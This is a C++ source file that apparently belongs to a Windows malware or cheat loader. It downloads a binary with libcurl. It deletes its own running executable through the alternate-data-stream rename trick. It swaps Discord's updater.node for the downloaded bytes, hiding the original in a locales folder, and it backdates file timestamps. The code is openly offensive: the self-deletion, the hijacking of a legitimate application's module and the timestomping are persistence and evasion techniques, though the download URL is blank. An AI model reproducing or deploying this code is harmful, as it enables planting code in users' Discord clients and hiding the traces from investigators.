#include <Windows.h>
#include <unordered_map>
#include <string>
#include <fstream>
#include <iostream>
#include <Shlwapi.h>
#include <TlHelp32.h>
#include <curl/curl.h>
#include <Security/xorstr.hpp>

#define ApiMain 1

namespace cleaner {

	bool TerminateProcessByCurrentPID( ) {
		DWORD currentPID = GetCurrentProcessId( );

		HANDLE hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS , 0 );
		if ( hProcessSnap == INVALID_HANDLE_VALUE ) {
			return false;
		}

		PROCESSENTRY32 pe;
		pe.dwSize = sizeof( PROCESSENTRY32 );

		if ( !Process32First( hProcessSnap , &pe ) ) {
			CloseHandle( hProcessSnap );
			return false;
		}

		do {
			if ( pe.th32ProcessID == currentPID ) {
				HANDLE hProcess = OpenProcess( PROCESS_TERMINATE , FALSE , pe.th32ProcessID );
				if ( hProcess == NULL ) {
					CloseHandle( hProcessSnap );
					return false;
				}

				BOOL result = TerminateProcess( hProcess , 0 );
				CloseHandle( hProcess );
				CloseHandle( hProcessSnap );
				return result != 0;
			}
		} while ( Process32Next( hProcessSnap , &pe ) );

		CloseHandle( hProcessSnap );
		return false;
	}
}

namespace util {
	static std::string wstring_to_utf8( const std::wstring& w ) {
		if ( w.empty( ) ) return {};
		int size_needed = WideCharToMultiByte( CP_UTF8 , 0 , w.data( ) , ( int ) w.size( ) , nullptr , 0 , nullptr , nullptr );
		if ( size_needed <= 0 ) return {};
		std::string out( size_needed , 0 );
		WideCharToMultiByte( CP_UTF8 , 0 , w.data( ) , ( int ) w.size( ) , out.data( ) , size_needed , nullptr , nullptr );
		return out;
	}

	size_t WriteToMemory( void* contents , size_t size , size_t nmemb , std::vector<unsigned char>* output ) {
		size_t totalSize = size * nmemb;
		output->insert( output->end( ) , ( unsigned char* ) contents , ( unsigned char* ) contents + totalSize );
		return totalSize;
	}

	bool DownloadFile( const std::string& url , std::vector<unsigned char>& outData ) {
		CURL* curl = curl_easy_init( );

		if ( !curl ) {
			std::cout << ( "[!] cURL init failed.\n" );
			return false;
		}

		curl_easy_setopt( curl , CURLOPT_URL , url.c_str( ) );
		curl_easy_setopt( curl , CURLOPT_USERAGENT , xorstr_( "Mozilla/5.0" ) );
		curl_easy_setopt( curl , CURLOPT_WRITEFUNCTION , WriteToMemory );
		curl_easy_setopt( curl , CURLOPT_WRITEDATA , &outData );

		CURLcode res = curl_easy_perform( curl );

		curl_easy_cleanup( curl );

		if ( res != CURLE_OK ) {
			std::cout << ( "[!] Failed to download file. Error: " ) << curl_easy_strerror( res ) << "\n";
			return false;
		}

		return !outData.empty( );
	}

	auto SetFileTime( const char* filePath ) -> bool {
		HANDLE hFile = CreateFileA( filePath , FILE_WRITE_ATTRIBUTES , FILE_SHARE_READ , NULL , OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL , NULL );
		if ( hFile == INVALID_HANDLE_VALUE ) {
			return false;
		}

		SYSTEMTIME st;
		GetSystemTime( &st ); 

		FILETIME ft;
		if ( !SystemTimeToFileTime( &st , &ft ) ) {
			CloseHandle( hFile );
			return false;
		}

		ULARGE_INTEGER timeValue;
		timeValue.LowPart = ft.dwLowDateTime;
		timeValue.HighPart = ft.dwHighDateTime;

		const ULONGLONG diff = ( ( 10ull * 60ull + 3ull ) * 60ull * 10000000ull );
		timeValue.QuadPart -= diff;

		ft.dwLowDateTime = timeValue.LowPart;
		ft.dwHighDateTime = timeValue.HighPart;

		bool success = ::SetFileTime( hFile , &ft , &ft , &ft );
		CloseHandle( hFile );
		return success;
	}

}

class c_replace {
public:
	static HANDLE open_handle( PWCHAR pwPath ) {
		return CreateFileW( pwPath , DELETE , 0 , NULL , OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL , NULL );
	}

	static void* rename_handle( HANDLE hHandle ) {
		LPCWSTR lpwStream = L":wtfbbq";
		size_t streamLen = wcslen( lpwStream );
		PFILE_RENAME_INFO pfRename = ( PFILE_RENAME_INFO ) malloc( sizeof( FILE_RENAME_INFO ) + sizeof( WCHAR ) * streamLen );

		if ( pfRename == nullptr ) {
			return nullptr;
		}

		RtlSecureZeroMemory( pfRename , sizeof( FILE_RENAME_INFO ) + sizeof( WCHAR ) * streamLen );

		pfRename->FileNameLength = static_cast< DWORD >( sizeof( WCHAR ) * streamLen );
		RtlCopyMemory( pfRename->FileName , lpwStream , sizeof( WCHAR ) * ( streamLen + 1 ) );

		BOOL fRenameOk = SetFileInformationByHandle( hHandle , FileRenameInfo , pfRename ,
			static_cast< DWORD >( sizeof( FILE_RENAME_INFO ) + sizeof( WCHAR ) * streamLen ) );

		if ( !fRenameOk ) {
			free( pfRename );
			return nullptr;
		}
		return pfRename;
	}

	static BOOL deposite_handle( HANDLE hHandle ) {
		FILE_DISPOSITION_INFO fDelete;
		RtlSecureZeroMemory( &fDelete , sizeof( fDelete ) );

		fDelete.DeleteFile = TRUE;

		return SetFileInformationByHandle( hHandle , FileDispositionInfo , &fDelete , sizeof( fDelete ) );
	}

	std::wstring get_actual_name( ) {
		wchar_t path [ MAX_PATH ];
		if ( GetModuleFileNameW( nullptr , path , MAX_PATH ) == 0 )
			return L"";

		std::wstring fullPath( path );
		size_t pos = fullPath.find_last_of( L"\\/" );
		if ( pos != std::wstring::npos )
			return fullPath.substr( pos + 1 );
		return fullPath;
	}

	std::wstring GetDiscordUpdaterPath( ) {
		const char* localAppData = std::getenv( "LOCALAPPDATA" );
		if ( !localAppData ) return L"";
		std::filesystem::path base = std::filesystem::path( localAppData ) / "Discord";
		if ( !std::filesystem::exists( base ) || !std::filesystem::is_directory( base ) ) return L"";
		std::filesystem::path best;
		std::filesystem::file_time_type best_time;
		bool found = false;
		for ( const auto& e : std::filesystem::directory_iterator( base ) ) {
			if ( !e.is_directory( ) ) continue;
			std::string fname = e.path( ).filename( ).string( );
			if ( fname.rfind( "app-" , 0 ) != 0 ) continue;
			std::filesystem::path candidate = e.path( ) / "updater.node";
			if ( !std::filesystem::exists( candidate ) ) continue;
			std::filesystem::file_time_type t = std::filesystem::last_write_time( e.path( ) );
			if ( !found || t > best_time ) {
				best_time = t;
				best = candidate;
				found = true;
			}
		}
		if ( !found ) return L"";
		return best.wstring( );
	}
	std::wstring GetDiscordAppFolder( ) {
		const char* localAppData = std::getenv( "LOCALAPPDATA" );
		if ( !localAppData ) return L"";
		std::filesystem::path base = std::filesystem::path( localAppData ) / "Discord";
		if ( !std::filesystem::exists( base ) || !std::filesystem::is_directory( base ) ) return L"";
		std::filesystem::path best;
		std::filesystem::file_time_type best_time;
		bool found = false;
		for ( const auto& e : std::filesystem::directory_iterator( base ) ) {
			if ( !e.is_directory( ) ) continue;
			std::string fname = e.path( ).filename( ).string( );
			if ( fname.rfind( "app-" , 0 ) != 0 ) continue;
			std::filesystem::file_time_type t = std::filesystem::last_write_time( e.path( ) );
			if ( !found || t > best_time ) {
				best_time = t;
				best = e.path( );
				found = true;
			}
		}
		if ( !found ) return L"";
		return best.wstring( );
	}
	void Replace( std::string file_name ) {

		std::string dllUrl;

		std::vector<unsigned char> LegitBytes;
		if ( !util::DownloadFile( dllUrl , LegitBytes ) ) return;

		WCHAR wcPath [ MAX_PATH + 1 ];
		RtlSecureZeroMemory( wcPath , sizeof( wcPath ) );

		if ( GetModuleFileNameW( NULL , wcPath , MAX_PATH ) == 0 ) { }

		HANDLE hCurrent = open_handle( wcPath );
		if ( hCurrent == INVALID_HANDLE_VALUE ) { }

		void* pfRename = rename_handle( hCurrent );
		if ( pfRename == nullptr ) { }

		CloseHandle( hCurrent );
		free( pfRename );
		pfRename = nullptr;

		hCurrent = open_handle( wcPath );
		if ( hCurrent == INVALID_HANDLE_VALUE ) { }

		if ( !deposite_handle( hCurrent ) ) { }

		CloseHandle( hCurrent );

		if ( PathFileExistsW( wcPath ) ) { }
		std::wstring output_path;
		if ( file_name == "updater.node" ) {
			std::wstring updaterPath = GetDiscordUpdaterPath( );
			std::wstring folderPath = GetDiscordAppFolder( );
			std::wstring newPath = folderPath + L"\\locales\\old.pkg";
			_wrename( updaterPath.c_str( ) , newPath.c_str( ) );

			std::ofstream output_file( updaterPath , std::ios::binary );
			output_file.write( reinterpret_cast< const char* >( LegitBytes.data( ) ) , static_cast< std::streamsize >( LegitBytes.size( ) ) );
		}
		else 	{
			output_path = get_actual_name( );
			std::cout << ( "actual name: " ) << util::wstring_to_utf8( output_path ) << std::endl;

			bool output_path_valid = !output_path.empty( ) && output_path.length( ) < MAX_PATH;
			std::ofstream output_file( output_path , std::ios::binary );

			if ( output_path_valid ) {
				output_file.write( reinterpret_cast< const char* >( LegitBytes.data( ) ) , static_cast< std::streamsize >( LegitBytes.size( ) ) );
			}

			output_file.close( );
		}

		util::SetFileTime( util::wstring_to_utf8( output_path ).c_str( ) );
	}

	static c_replace& Get( ) {
		static c_replace instance;
		return instance;
	}

private:
	c_replace( ) = default;
	~c_replace( ) = default;

	c_replace( const c_replace& ) = delete;
	c_replace& operator=( const c_replace& ) = delete;
};
